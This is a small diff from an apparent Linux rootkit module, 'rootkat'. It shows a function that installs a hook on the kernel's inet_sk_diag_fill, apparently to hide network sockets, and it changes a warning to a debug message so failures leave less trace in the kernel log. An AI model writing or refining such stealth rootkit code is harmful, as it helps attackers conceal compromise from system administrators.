@@ -66,7 +66,7 @@ int rootkat_hook_inet_sk_diag_fill_install(void)
 	 * yet, so the symbol isn't in kallsyms. Trigger autoload first. */
 	rc = request_module("inet_diag");
 	if (rc)
-		pr_warn(TAG "request_module(inet_diag) returned %d (continuing anyway)\n",
+		pr_debug(TAG "request_module(inet_diag) returned %d (continuing anyway)\n",
 		        rc);
 
 	return rootkat_hook_install(&hook_inet_sk_diag_fill);
